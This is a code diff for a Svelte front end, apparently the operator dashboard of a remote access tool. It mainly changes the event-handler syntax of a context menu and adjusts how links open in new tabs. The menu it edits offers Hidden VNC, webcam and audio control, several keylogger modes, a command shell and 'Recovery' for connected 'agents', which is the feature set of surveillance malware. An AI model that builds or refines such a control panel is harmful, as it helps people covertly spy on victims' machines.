@@ -573,26 +573,26 @@
 			return;
 		}
 
-	if (target === '_self') {
-		goto(url);
-		return;
-	}
-
-	if (target === '_blank') {
-		const newWindow = window.open(url, '_blank', 'noopener,noreferrer');
-
-		if (!newWindow) {
-			console.warn('Pop-up blocked when attempting to open client tool in a new tab.');
-			window.location.assign(url);
+		if (target === '_self') {
+			goto(url);
 			return;
 		}
 
-		newWindow.opener = null;
-		return;
-	}
+		if (target === '_blank') {
+			const newWindow = window.open(url, '_blank', 'noopener');
 
-	window.open(url, target, 'noopener,noreferrer');
-}
+			if (!newWindow) {
+				console.warn('Pop-up blocked when attempting to open client tool in a new tab.');
+				return;
+			}
+
+			newWindow.opener = null;
+			newWindow.focus?.();
+			return;
+		}
+
+		window.open(url, target, 'noopener');
+	}
 </script>
 
 <svelte:head>
@@ -805,10 +805,10 @@
 										</TableRow>
 									</ContextMenuTrigger>
 									<ContextMenuContent class="w-56">
-										<ContextMenuItem on:select={() => openSection('systemInfo', agent)}>
+										<ContextMenuItem onSelect={() => openSection('systemInfo', agent)}>
 											System Info
 										</ContextMenuItem>
-										<ContextMenuItem on:select={() => openSection('notes', agent)}>
+										<ContextMenuItem onSelect={() => openSection('notes', agent)}>
 											Notes
 										</ContextMenuItem>
 
@@ -817,39 +817,39 @@
 										<ContextMenuSub>
 											<ContextMenuSubTrigger>Control</ContextMenuSubTrigger>
 											<ContextMenuSubContent class="w-48">
-												<ContextMenuItem on:select={() => openSection('hiddenVnc', agent)}>
+												<ContextMenuItem onSelect={() => openSection('hiddenVnc', agent)}>
 													Hidden VNC
 												</ContextMenuItem>
-												<ContextMenuItem on:select={() => openSection('remoteDesktop', agent)}>
+												<ContextMenuItem onSelect={() => openSection('remoteDesktop', agent)}>
 													Remote Desktop
 												</ContextMenuItem>
-												<ContextMenuItem on:select={() => openSection('webcamControl', agent)}>
+												<ContextMenuItem onSelect={() => openSection('webcamControl', agent)}>
 													Webcam Control
 												</ContextMenuItem>
-												<ContextMenuItem on:select={() => openSection('audioControl', agent)}>
+												<ContextMenuItem onSelect={() => openSection('audioControl', agent)}>
 													Audio Control
 												</ContextMenuItem>
 												<ContextMenuSub>
 													<ContextMenuSubTrigger>Keylogger</ContextMenuSubTrigger>
 													<ContextMenuSubContent class="w-48">
 														<ContextMenuItem
-															on:select={() => openSection('keyloggerOnline', agent)}
+															onSelect={() => openSection('keyloggerOnline', agent)}
 														>
 															Online
 														</ContextMenuItem>
 														<ContextMenuItem
-															on:select={() => openSection('keyloggerOffline', agent)}
+															onSelect={() => openSection('keyloggerOffline', agent)}
 														>
 															Offline
 														</ContextMenuItem>
 														<ContextMenuItem
-															on:select={() => openSection('keyloggerAdvanced', agent)}
+															onSelect={() => openSection('keyloggerAdvanced', agent)}
 														>
 															Advanced Online
 														</ContextMenuItem>
 													</ContextMenuSubContent>
 												</ContextMenuSub>
-												<ContextMenuItem on:select={() => openSection('cmd', agent)}>
+												<ContextMenuItem onSelect={() => openSection('cmd', agent)}>
 													CMD
 												</ContextMenuItem>
 											</ContextMenuSubContent>
@@ -860,22 +860,22 @@
 										<ContextMenuSub>
 											<ContextMenuSubTrigger>Management</ContextMenuSubTrigger>
 											<ContextMenuSubContent class="w-48">
-												<ContextMenuItem on:select={() => openSection('fileManager', agent)}>
+												<ContextMenuItem onSelect={() => openSection('fileManager', agent)}>
 													File Manager
 												</ContextMenuItem>
-												<ContextMenuItem on:select={() => openSection('taskManager', agent)}>
+												<ContextMenuItem onSelect={() => openSection('taskManager', agent)}>
 													Task Manager
 												</ContextMenuItem>
-												<ContextMenuItem on:select={() => openSection('registryManager', agent)}>
+												<ContextMenuItem onSelect={() => openSection('registryManager', agent)}>
 													Registry Manager
 												</ContextMenuItem>
-												<ContextMenuItem on:select={() => openSection('startupManager', agent)}>
+												<ContextMenuItem onSelect={() => openSection('startupManager', agent)}>
 													Startup Manager
 												</ContextMenuItem>
-												<ContextMenuItem on:select={() => openSection('clipboardManager', agent)}>
+												<ContextMenuItem onSelect={() => openSection('clipboardManager', agent)}>
 													Clipboard Manager
 												</ContextMenuItem>
-												<ContextMenuItem on:select={() => openSection('tcpConnections', agent)}>
+												<ContextMenuItem onSelect={() => openSection('tcpConnections', agent)}>
 													TCP Connections
 												</ContextMenuItem>
 											</ContextMenuSubContent>
@@ -883,10 +883,10 @@
 
 										<ContextMenuSeparator />
 
-										<ContextMenuItem on:select={() => openSection('recovery', agent)}>
+										<ContextMenuItem onSelect={() => openSection('recovery', agent)}>
 											Recovery
 										</ContextMenuItem>
-										<ContextMenuItem on:select={() => openSection('options', agent)}>
+										<ContextMenuItem onSelect={() => openSection('options', agent)}>
 											Options
 										</ContextMenuItem>
 
@@ -895,23 +895,23 @@
 										<ContextMenuSub>
 											<ContextMenuSubTrigger>Miscellaneous</ContextMenuSubTrigger>
 											<ContextMenuSubContent class="w-48">
-												<ContextMenuItem on:select={() => openSection('openUrl', agent)}>
+												<ContextMenuItem onSelect={() => openSection('openUrl', agent)}>
 													Open URL
 												</ContextMenuItem>
-												<ContextMenuItem on:select={() => openSection('messageBox', agent)}>
+												<ContextMenuItem onSelect={() => openSection('messageBox', agent)}>
 													Message Box
 												</ContextMenuItem>
-												<ContextMenuItem on:select={() => openSection('clientChat', agent)}>
+												<ContextMenuItem onSelect={() => openSection('clientChat', agent)}>
 													Client Chat
 												</ContextMenuItem>
-												<ContextMenuItem on:select={() => openSection('reportWindow', agent)}>
+												<ContextMenuItem onSelect={() => openSection('reportWindow', agent)}>
 													Report Window
 												</ContextMenuItem>
-												<ContextMenuItem on:select={() => openSection('ipGeolocation', agent)}>
+												<ContextMenuItem onSelect={() => openSection('ipGeolocation', agent)}>
 													IP Geolocation
 												</ContextMenuItem>
 												<ContextMenuItem
-													on:select={() => openSection('environmentVariables', agent)}
+													onSelect={() => openSection('environmentVariables', agent)}
 												>
 													Environment Variables
 												</ContextMenuItem>
@@ -923,10 +923,10 @@
 										<ContextMenuSub>
 											<ContextMenuSubTrigger>System Controls</ContextMenuSubTrigger>
 											<ContextMenuSubContent class="w-48">
-												<ContextMenuItem on:select={() => openSection('reconnect', agent)}>
+												<ContextMenuItem onSelect={() => openSection('reconnect', agent)}>
 													Reconnect
 												</ContextMenuItem>
-												<ContextMenuItem on:select={() => openSection('disconnect', agent)}>
+												<ContextMenuItem onSelect={() => openSection('disconnect', agent)}>
 													Disconnect
 												</ContextMenuItem>
 											</ContextMenuSubContent>
@@ -937,16 +937,16 @@
 										<ContextMenuSub>
 											<ContextMenuSubTrigger>Power</ContextMenuSubTrigger>
 											<ContextMenuSubContent class="w-48">
-												<ContextMenuItem on:select={() => openSection('shutdown', agent)}>
+												<ContextMenuItem onSelect={() => openSection('shutdown', agent)}>
 													Shutdown
 												</ContextMenuItem>
-												<ContextMenuItem on:select={() => openSection('restart', agent)}>
+												<ContextMenuItem onSelect={() => openSection('restart', agent)}>
 													Restart
 												</ContextMenuItem>
-												<ContextMenuItem on:select={() => openSection('sleep', agent)}>
+												<ContextMenuItem onSelect={() => openSection('sleep', agent)}>
 													Sleep
 												</ContextMenuItem>
-												<ContextMenuItem on:select={() => openSection('logoff', agent)}>
+												<ContextMenuItem onSelect={() => openSection('logoff', agent)}>
 													Logoff
 												</ContextMenuItem>
 											</ContextMenuSubContent>
@@ -954,7 +954,7 @@
 
 										<ContextMenuSeparator />
 
-										<ContextMenuItem on:select={() => copyAgentId(agent.id)}>
+										<ContextMenuItem onSelect={() => copyAgentId(agent.id)}>
 											Copy agent ID
 										</ContextMenuItem>
 									</ContextMenuContent>
